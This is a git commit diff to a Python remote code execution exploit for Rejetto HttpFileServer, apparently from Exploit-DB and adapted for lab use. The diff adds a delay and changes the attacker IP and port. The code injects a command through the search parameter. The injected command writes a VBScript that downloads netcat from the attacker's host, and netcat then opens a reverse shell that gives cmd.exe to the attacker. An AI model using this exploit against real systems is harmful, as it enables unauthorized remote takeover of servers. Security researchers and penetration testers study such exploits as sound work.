d7dd824dfa5c9b9cec1132dc2159b1563b0deffe
ouroboroseye <gabrielrobles93@gmail.com>
2020-02-18 22:41:14 -0500

    Add sleep to rejetto httpfileserver RCE

--- Apps/HttpFileServer_rce.py
+++ Apps/HttpFileServer_rce.py
@@ -18,7 +18,7 @@
 #EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
 #          You may need to run it multiple times for success!
 
-
+import time
 import urllib2
 import sys
 
@@ -28,17 +28,18 @@ try:
 
 	def execute_script():
 		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")
+                time.sleep(1)
 
 	def nc_run():
 		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
 
-	ip_addr = "10.11.0.69" #local IP address
-	local_port = "6464" # Local Port number
-	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
+	ip_addr = "10.10.14.21" #local IP address
+	local_port = "3001" # Local Port number
+	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc64.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc64.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
 	save= "save|" + vbs
 	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
 	exe= "exec|"+vbs2
-	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
+	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc64.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
 	exe1= "exec|"+vbs3
 	script_create()
 	execute_script()
